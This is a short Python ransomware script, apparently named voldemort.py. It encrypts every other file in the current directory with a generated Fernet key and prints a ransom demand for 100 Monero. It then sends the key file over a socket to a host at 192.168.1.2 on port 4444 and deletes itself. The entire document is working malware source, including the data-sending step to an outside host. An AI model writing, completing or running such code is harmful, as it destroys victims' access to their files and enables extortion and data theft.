import subprocess
import sys
import os
from cryptography.fernet import Fernet
import socket
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Ejemplo de uso:
install('cryptography')
files = []

for file in os.listdir():
    if file == "voldemort.py" or file == "key.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)

key = Fernet.generate_key()

with open("key.key", "wb") as key_file:
    key_file.write(key)

for file in files:
    with open(file, "rb") as f:
        data = f.read()
    data_encrypted = Fernet(key).encrypt(data)
    with open(file, "wb") as f:
        f.write(data_encrypted)
print("All files encrypted! Send me 100 Monero(XMR) to my wallet(WALLET)")
def send_file_to_host(file_path, host, port):
    with open(file_path, 'rb') as file:
        data = file.read()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        s.sendall(data)

# Usage:
send_file_to_host('key.key', '192.168.1.2', 4444)
#Delete the randsomware
os.remove("voldemort.py")
